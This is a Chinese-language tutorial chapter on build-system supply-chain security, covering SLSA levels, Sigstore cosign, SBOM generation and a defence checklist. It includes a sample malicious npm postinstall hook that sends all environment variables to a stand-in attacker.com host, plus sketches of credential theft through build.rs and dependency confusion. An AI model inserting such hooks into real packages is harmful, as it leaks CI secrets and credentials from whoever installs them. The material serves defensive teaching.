---
tags:
  - build-systems
  - tier3
  - supply-chain-security
  - slsa
  - sbom
  - sigstore
---
# 构建系统安全性与供应链

> [!abstract] TL;DR
> 构建系统是软件供应链中最高密度的攻击面：一次成功的构建环境入侵可以污染数千个下游用户的制品。SLSA 四级框架提供了从"无保证"到"完全可验证"的渐进路径；SBOM（软件物料清单）使供应链可审计；Sigstore cosign 实现了无密钥签名验证。本章包含真实攻击手法描述，**仅用于防御研究**。

> [!caution] 免责声明
> 本章中描述的攻击技术（依赖混淆、typosquatting、恶意构建脚本注入等）**仅用于防御研究与安全意识培训**。在未经授权的系统上实施这些技术是违法行为。所有示例均以防御视角呈现。安全研究人员如需测试，应在自建的隔离环境中进行。

## 概述与定位

### 构建系统为何是首要攻击面

软件供应链攻击的价值在于"一次入侵，万倍传播"。构建系统处于供应链的核心节点：

```
源代码（开发者写） → 构建系统（编译/打包） → 分发渠道（CDN/仓库） → 最终用户
```

2020 年的 SolarWinds 攻击正是在构建系统环节植入恶意代码，最终影响了 18000 多个组织。2021 年的 ua-parser-js npm 包投毒，导致数百万次下载安装了挖矿程序。攻击者瞄准构建系统的根本逻辑是：与其攻击每一个最终用户（成本极高），不如攻击一个上游节点，让制品在"正常"的分发流程中自动传播到所有下游。

### 攻击向量分类

| 攻击类型 | 入侵点 | 典型案例 |
|---------|------|---------|
| 依赖混淆 | 包仓库 | Birsan 2021 |
| Typosquatting | 包仓库 | `requets` → `requests` |
| 恶意构建脚本 | build.rs / postinstall | event-stream 2018 |
| CI/CD 环境入侵 | 构建服务器 | SolarWinds 2020 |
| 镜像投毒 | Docker Hub | 多起挖矿镜像事件 |
| 代码仓库入侵 | Git 历史篡改 | 罕见但存在 |

## 原理与机制

### SLSA 四级模型的具体要求

SLSA（Supply-chain Levels for Software Artifacts，读作"Salsa"）是 Google 主导、CNCF 托管的框架，定义了四个安全级别：

| 级别 | 名称 | 关键要求 | 可防御的威胁 |
|------|------|---------|------------|
| **L0** | 无保证 | 无任何要求 | — |
| **L1** | 文档化 | 构建过程有记录（Provenance 文档存在） | 意外错误 |
| **L2** | 托管 | 构建在托管 CI 上执行；Provenance 由 CI 签名 | 单点内部攻击 |
| **L3** | 强化 | 完全可重现构建；Provenance 经验证；Builder 本身可审计 | 持续性内部威胁 |

**SLSA L1** 的最低要求是"存在 Provenance 文档"——记录了谁在什么时候用什么源码构建了这个制品。L1 不验证这个记录是否可信（攻击者自己也可以写一份假的 Provenance），但它建立了可审计的基础。

**SLSA L2** 要求构建在"托管 CI"上执行，且 Provenance 由 CI 平台（GitHub Actions/GitLab CI/CircleCI 等）使用其私钥签名。L2 的关键改进是 Provenance 的签名者是 CI 平台，而非开发者个人——这防止了开发者在本地构建恶意制品后伪造 Provenance。GitHub Actions OIDC 令牌是实现 L2 的标准机制：Actions 运行时会向 Sigstore 申请一个短期 OIDC 令牌，该令牌绑定到具体的 repo/workflow/commit SHA，用于签名 Provenance。

**SLSA L3** 的强化要求：
- **构建在沙盒执行**（如 Bazel hermetic build 或独立容器）：防止构建读取 CI 机器上的其他凭证
- **所有输入有加密哈希记录**：源码 commit SHA + 所有依赖的哈希，防止替换输入而不改变 Provenance
- **Provenance 由 Builder 私钥签名，Builder 私钥不可被开发者访问**：即使 CI 账号被攻击者控制，也无法用普通 CI Token 签出与 L3 Builder 等效的 Provenance
- **第三方可独立验证 Provenance**：任何人可以用 Sigstore 的公开透明日志验证签名，无需信任签名者的证书链

**L3 的实际含义**是"构建本身是可信赖的"——不依赖"信任 CI 平台的员工不会作恶"，而是通过密码学手段让外部验证者可以独立验证构建的完整性。当前 npm、PyPI 等主流仓库正在逐步要求流行包实现 SLSA L2 或以上。

### Provenance 的密码学原理

**in-toto attestation** 是 SLSA 使用的 Provenance 格式标准。一份 attestation 包含：
- `subject`：被证明的制品（通常是构建产物的哈希列表）
- `predicateType`：声明类型（如 `slsa.dev/provenance/v1`）
- `predicate`：实际的 Provenance 内容（builder ID、材料列表、命令行参数、时间戳等）

这份 attestation 用签名者的私钥签名（ECDSA P-256），签名结果连同公钥证书上传到 Sigstore 的 **Rekor** 透明日志。Rekor 是一个不可变的追加日志，类似区块链的设计——一旦记录就无法删除或修改，且任何人可以独立验证条目的真实性。

**无密钥签名（keyless signing）**的工作流：签名者（如 GitHub Actions）向 Sigstore 的 Fulcio CA 提交 OIDC 令牌，Fulcio 验证 OIDC 令牌后颁发一个短期证书（有效期 10 分钟），签名者用这个短期证书签名制品，然后证书和签名一起上传到 Rekor。验证者检查 Rekor 中的条目，验证证书由 Fulcio 颁发（Fulcio 是公认的可信 CA），且证书里的 OIDC claims（repo/workflow/commit）与预期匹配。这套机制的优点是无需管理长期私钥——私钥只在内存中存活 10 分钟，之后即使被泄露也无法重新使用（证书已过期）。

### 攻击向量详细原理

#### 依赖混淆攻击完整攻击链

```
1. 侦察：攻击者扫描 GitHub 泄露的 package.json / requirements.txt
   → 发现 "target-corp-internal-utils" 包名，PyPI 上不存在

2. 投毒：攻击者向 PyPI 上传
   名称: "target-corp-internal-utils"
   版本: 9.9.9（远高于内部版本 1.2.3）
   包内容: postinstall 钩子或 __init__.py 中含反弹 shell

3. 触发：
   - 若 pip 配置了 extra-index-url，同时查询公私仓库
   - pip 选择版本最高的包 → 安装恶意 9.9.9 版本
   - 受影响范围：所有开发者本机 + 所有 CI 构建

4. 执行：
   - postinstall 钩子在 pip install 过程中以安装用户权限执行
   - 可读取 SSH 密钥、AWS 凭证、git 配置等敏感信息
   - 建立持久化后门或外泄数据
```

依赖混淆攻击的攻击窗口来自包管理器的"版本最高优先"策略与"公私仓库合并查询"的叠加。防御的关键不是"限制版本号"，而是从根本上消除"公私仓库合并查询"——使用 Cargo 的 `source replacement` 或 pip 的纯镜像模式（只有一个仓库，私有仓库完全代理公共仓库）是比 `extra-index-url` 更安全的架构。

#### Typosquatting 检测与防御

常见 typosquatting 模式：
- 字符替换：`requets`（遗漏字母）
- 分隔符变换：`python-dotenv` vs `python_dotenv`（在 pip 中两者等价，但在 npm 中不同）
- 前缀/后缀添加：`requests-secure`、`requests2`

```bash
# 使用 TypoSquat 检测工具
pip install typogard
typogard check requirements.txt

# npm
npm install -g @lirantal/package-checker
pkgchecker check --package requests
```

typosquatting 的防御比依赖混淆更困难，因为包名是公开注册的，任何人都可以抢注相似名称。最有效的防御是：在添加新依赖前，在 CI 中运行包名相似度检查；对于关键基础设施包，固定哈希而非版本号。

#### 恶意 npm postinstall 钩子

```json
// 恶意包的 package.json
{
  "name": "innocent-looking-package",
  "scripts": {
    "postinstall": "node -e \"require('https').get('https://attacker.com/exfil?data='+Buffer.from(JSON.stringify(process.env)).toString('base64'))\""
  }
}
```

`npm install` 时，`postinstall` 脚本自动执行，可外泄全部环境变量（含 `NPM_TOKEN`、`AWS_ACCESS_KEY_ID` 等 CI 密钥）。

#### 恶意 build.rs（Cargo）

```rust
// 恶意 crate 的 build.rs
fn main() {
    // 看似无害的 "检测系统" 代码
    if std::env::var("CI").is_ok() {
        // CI 环境中：外泄凭证
        let home = std::env::var("HOME").unwrap_or_default();
        // 读取 ~/.ssh/id_rsa, ~/.aws/credentials 等
        // 通过 HTTP 发送到攻击者服务器
    }
}
```

## 结构/算法/伪代码详解

### SBOM 生成时机与格式选择

SBOM（Software Bill of Materials）是软件制品中所有组件的清单。**生成时机**的选择有重要安全含义：

- **构建时生成（推荐）**：SBOM 由构建工具直接输出，精确反映编译进制品的依赖集合，无遗漏。工具：`syft`（读取构建产物）、`cargo-sbom`（读取 Cargo.lock）
- **事后扫描**：通过分析容器镜像中的文件（`.deb` 数据库、Python `.dist-info` 等）反推依赖。优点是不需要构建过程配合，缺点是可能遗漏动态加载的库或静态链接后无 metadata 的依赖

**格式标准对比**：
- **SPDX**（Software Package Data Exchange，Linux Foundation）：历史更长，字段丰富，支持 TV/RDF/JSON/YAML 等多种序列化格式，与 FOSS 许可证合规工具集成好
- **CycloneDX**（OWASP）：JSON/XML 格式，侧重安全漏洞分析，与 Grype/Trivy 等漏洞扫描工具集成更直接，VEX（漏洞可利用性交流）扩展支持更完善

两种格式可以互转（Syft 支持同时输出），组织内可以选择一种作为主格式。实践建议：如果主要需求是许可证合规，选 SPDX；如果主要需求是漏洞管理，选 CycloneDX。

```bash
# 安装 syft
curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sh -s -- -b /usr/local/bin

# 为容器镜像生成 SBOM
syft my-app:latest -o spdx-json > sbom.spdx.json

# 为目录生成 SBOM
syft dir:./my-project -o cyclonedx-json > sbom.cyclonedx.json

# 为 Cargo 项目生成 SBOM（包含所有 Rust crate）
syft dir:. --scope all-layers -o spdx-json > sbom.spdx.json

# 使用 grype 扫描 SBOM 中的已知漏洞
grype sbom:sbom.spdx.json
```

### Reproducible Build（可重现构建）的验证意义

可重现构建（Reproducible Build）是指：相同的源码输入，在不同机器/时间/环境下，产生逐字节相同的输出二进制。这乍看是一个技术追求，实则有深刻的安全意义：

**验证流程**：
1. 构建者 A 使用标准构建环境构建 `my-app` → 得到 `hash(binary) = abcd...`
2. 独立验证者 B 使用相同 Dockerfile 在自己的机器上重新构建 → 得到 `hash(binary) = abcd...`
3. 两者哈希一致 → 证明 A 没有在构建过程中注入任何不在源码中的内容

这就是可重现构建对抗缓存污染攻击（ch10 中提到）和 CI/CD 入侵攻击的机制：即使攻击者控制了构建服务器并污染了制品，只要有人重新构建并比对哈希，就能发现异常。Debian 项目有超过 95% 的软件包实现了可重现构建，可在 `reproducible-builds.org` 上查看各包的重现状态。

### Sigstore cosign 签名验证示例

Sigstore 是 Linux Foundation 支持的开放签名基础设施，cosign 支持**无密钥签名**（使用 OIDC 临时密钥，签名记录在公开的透明日志 Rekor 中）：

```bash
# 安装 cosign
brew install cosign

# 无密钥签名容器镜像（使用 GitHub Actions OIDC 令牌）
# 在 GitHub Actions 中：
cosign sign --yes ghcr.io/myorg/my-app:latest

# 验证签名（任何人可验证）
cosign verify ghcr.io/myorg/my-app:latest \
  --certificate-identity "https://github.com/myorg/my-repo/.github/workflows/release.yml@refs/heads/main" \
  --certificate-oidc-issuer "https://token.actions.githubusercontent.com"

# 签名本地文件（用传统密钥对）
cosign sign-blob --key cosign.key --output-signature sig.sig ./my-binary

# 验证文件签名
cosign verify-blob --key cosign.pub --signature sig.sig ./my-binary
```

### 供应链攻击与防御 Mermaid

```mermaid
flowchart TD
    subgraph Source["源码阶段"]
        S1[源代码仓库<br/>开发者提交]
        S2[依赖声明<br/>package.json / Cargo.toml]
    end

    subgraph Build["构建阶段"]
        B1[CI/CD 环境<br/>Runner 入侵]
        B2[构建脚本<br/>build.rs / postinstall]
        B3[构建工具链<br/>编译器/链接器投毒]
    end

    subgraph Registry["分发阶段"]
        R1[公共仓库<br/>crates.io / PyPI / npm]
        R2[私有仓库<br/>Artifactory / Nexus]
        R3[容器镜像仓库<br/>Docker Hub / GHCR]
    end

    subgraph Deploy["部署阶段"]
        D1[基础镜像<br/>FROM ubuntu 被篡改]
        D2[运行时依赖<br/>apt install 时植入]
    end

    subgraph Defense["防御措施"]
        P1[SLSA L3<br/>可重现构建]
        P2[SBOM<br/>成分清单]
        P3[cosign<br/>签名验证]
        P4[私有仓库<br/>优先策略]
        P5[cargo audit<br/>漏洞扫描]
    end

    S1 --> P1
    S2 --> P4
    B1 --> P1
    B2 --> P5
    R1 --> P4
    R2 --> P2
    R3 --> P3
    D1 --> P3
    D2 --> P2
```

## 工具视角与实战

### 多生态漏洞扫描

```bash
# Rust
cargo audit                          # RustSec 数据库
cargo deny check advisories          # 更细粒度的策略

# Node.js
npm audit
npm audit --json | jq '.vulnerabilities | to_entries[] | select(.value.severity=="critical")'

# Python
pip-audit -r requirements.txt
safety check -r requirements.txt --json

# 容器镜像（包含所有生态）
grype my-app:latest
trivy image my-app:latest

# SLSA Provenance 文档生成（GitHub Actions）
# 使用 slsa-framework/slsa-github-generator
```

### SLSA Provenance 文档生成

```yaml
# .github/workflows/release.yml
jobs:
  build:
    outputs:
      digests: ${{ steps.hash.outputs.digests }}
    steps:
      - name: Build artifact
        run: cargo build --release
      
      - name: Generate artifact hash
        id: hash
        run: |
          sha256sum target/release/my-app > checksums.txt
          echo "digests=$(cat checksums.txt | base64 -w0)" >> "$GITHUB_OUTPUT"

  provenance:
    needs: build
    # 使用 SLSA 官方 Action 生成并签名 Provenance 文档
    uses: slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@v2.0.0
    with:
      base64-subjects: "${{ needs.build.outputs.digests }}"
    permissions:
      id-token: write   # 需要 OIDC 令牌
      contents: write
      actions: read
```

### cargo-deny 策略检查

```toml
# deny.toml —— 项目级策略配置
[advisories]
db-urls = ["https://github.com/rustsec/advisory-db"]
vulnerability = "deny"
unmaintained = "warn"
yanked = "deny"

[licenses]
unlicensed = "deny"
allow = ["MIT", "Apache-2.0", "BSD-2-Clause", "BSD-3-Clause"]
deny = ["GPL-2.0", "AGPL-3.0"]  # 拒绝 copyleft 许可证

[bans]
multiple-versions = "warn"    # 警告同包多版本（增大攻击面）
deny = [
    { name = "openssl", version = "<3.0" },  # 禁止过旧的 OpenSSL 绑定
]
```

## 安全性与正确使用

> [!caution] 关于依赖混淆攻击的说明
> 本节描述的攻击链已在多个真实事件中被利用，包括针对 Microsoft、Apple、PayPal 等大型企业的测试（Alex Birsan 2021 年白帽测试）。理解攻击机制是构建有效防御的前提。**切勿在未获授权的环境中测试这些技术。不得将本章内容用于攻击他人生产系统或将攻击手法武器化。** 所有技术描述仅服务于防御性安全研究目的。

### 防御清单

**仓库配置层**：
- [ ] 内部包使用唯一 scope 或命名空间前缀（`@mycompany/`）
- [ ] pip 只配置 `index-url`，不使用 `extra-index-url`（或使用代理模式聚合）
- [ ] Cargo 内部 crate 注册到私有 registry，依赖中显式指定 `registry = "internal"`

**构建系统层**：
- [ ] 锁定构建工具版本（Dockerfile 中固定工具哈希而非 tag）
- [ ] 在无网络访问的沙盒中构建（防止 build.rs 外泄数据）
- [ ] 所有依赖哈希固定（Cargo.lock / package-lock.json 提交到仓库）

**制品分发层**：
- [ ] 容器镜像使用 cosign 签名，部署时验证签名
- [ ] 生成 SBOM 并与每次发布关联存档
- [ ] 实现 SLSA L2（至少）：在托管 CI 上构建，Provenance 由 CI 签名

**持续监控层**：
- [ ] CI 中运行 `cargo audit` / `npm audit` / `pip-audit`，发现高危漏洞阻断流水线
- [ ] 订阅使用的包的安全公告（GitHub Advisory、RustSec RSS）
- [ ] 定期使用 `grype` / `trivy` 扫描已部署的容器镜像

## 小结

构建系统安全不是一次性工作，而是需要在架构、流程和工具三个层面持续投入的工程实践。SLSA 框架提供了清晰的目标层级，大多数团队应优先实现 L2（托管 CI + 签名 Provenance），再逐步向 L3 演进。SLSA 的四级设计揭示了一个重要原则：安全保证的来源应该从"信任人"逐步转向"信任密码学"——L0 完全信任人，L3 通过 Provenance 签名和可重现构建，让独立第三方能够在不信任任何人的前提下验证制品的完整性。SBOM 和 cosign 的组合使制品可审计、可验证，是现代软件供应链安全的最小可行基础设施。依赖混淆和 typosquatting 攻击说明了"私有仓库隔离"比"私有仓库优先级"更安全，应从架构上消除"公私仓库合并查询"的可能。

## 相关阅读

- [SLSA 官网](https://slsa.dev/)
- [Sigstore / cosign](https://docs.sigstore.dev/)
- [SPDX 规范](https://spdx.dev/)
- [CycloneDX 规范](https://cyclonedx.org/)
- [Dependency Confusion 论文（Alex Birsan 2021）](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610)
- [anchore/syft](https://github.com/anchore/syft)

---
[[00.构建系统横向对比总览|⬆ 系列总览]] | [[11.分布式构建与远程执行|← 上一章]] | [[13.构建系统性能优化与实战选型|→ 下一章]]
